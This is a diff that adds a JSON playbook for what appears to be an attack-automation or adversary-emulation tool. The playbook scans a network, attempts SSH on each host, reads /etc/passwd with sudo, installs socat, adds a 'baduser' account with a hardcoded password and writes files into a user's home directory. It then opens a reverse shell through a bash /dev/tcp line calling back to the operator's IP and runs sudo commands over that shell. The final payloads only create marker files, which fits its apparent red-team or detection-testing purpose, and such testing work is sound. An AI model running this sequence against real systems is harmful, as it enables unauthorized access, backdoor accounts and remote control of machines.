@@ -1,0 +1,36 @@
+{
+    "name" : "basic",
+    "serial": 11248585048,
+    "actions": [
+        { "name":"ARPScan", "timeout":10, "update_host":true, "skip":false },
+        { "name":"Sleep", "input":10 },
+        { "name":"ICMPScan", "timeout":30, "update_host":true, "skip": true },
+        { "name":"Stop" },
+        { 
+            "name": "hit_each",
+            "loop": true,
+            "target": "host",
+            "actions": [
+                { "name":"SSHConnectionAttempt" }
+            ]
+        }, 
+        {
+            "name": "hit_each",
+            "loop": true,
+            "target": "target",
+            "actions": [
+                { "name":"SSHCommandExecution", "skip":true, "commands":"whoami,ps -ef,cat /etc/passwd", "sudo":true },
+                { "name":"InstallPackage", "skip":true, "package":"socat", "sudo":true, "connection":"ssh" },
+                { "name":"AddUser", "skip":true, "connection":"ssh", "username_to_add":"baduser", "new_password":"P@ssw0rd1!" },
+                { "name":"RemoveUser", "skip":true, "connection":"ssh", "username_to_remove":"baduser" },
+                { "name":"FileSystemWrite", "connection":"ssh", "remote_file":"/home/sysadmin/baduser", "contents":"bad bad leory brown", "local_file":"/tmp/test.txt" },
+                { "name":"FileSystemWrite", "connection":"ssh", "remote_file":"/home/sysadmin/baduser2", "local_file":"/tmp/test.txt", "mode":"append" },
+                { "name":"BindShell", "connection":"socat_reverse", "port":"{random:4444}", "register":"reverse_shell" },
+                { "name":"ExecuteCommand", "command":"bash &>/dev/tcp/{my_ip}/{replace:BindShell-random} <&1", "background":true, "connection":"ssh" },
+                { "name":"DirectExecute", "using":"reverse_shell", "command":"touch /tmp/brooks_was_here", "sudo":true},
+                { "name":"DirectExecute", "using":"reverse_shell", "command":"touch /tmp/so_was_stewie", "sudo":true}
+            ]
+        },
+        { "name":"Wait", "timeout":600 }
+    ]
+}
